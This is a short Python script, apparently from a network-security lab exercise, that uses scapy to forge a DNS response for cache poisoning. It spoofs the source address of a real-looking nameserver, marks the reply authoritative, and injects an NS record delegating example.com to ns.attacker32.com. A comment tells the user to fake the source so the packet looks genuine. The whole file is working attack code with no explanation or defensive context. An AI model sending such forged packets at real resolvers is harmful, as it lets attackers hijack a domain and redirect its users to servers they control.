from scapy.all import *

name = 'twysw.example.com'
domain = 'example.com'
ns = '10.0.2.7'


Qdsec = DNSQR(qname=name)
Anssec = DNSRR(rrname=name, type='A', rdata=ns, ttl=259200) 
NSsec = DNSRR(rrname=domain, type='NS', rdata='ns.attacker32.com', ttl=259200)


dns = DNS(id=0xAAAA, aa=1, rd=0, qr=1, qdcount=1, ancount=1, nscount=1, arcount=0, qd=Qdsec, an=Anssec, ns = NSsec)
ip = IP(dst='10.0.2.5', src='199.43.135.53', chksum=0) ##THE SOURCE NEEDS TO LOOOK LIKE ITS REAL, since we may have failed attempts before, fake the source
udp = UDP(dport=33333, sport=53, chksum=0) 

sr1(ip/udp/dns)


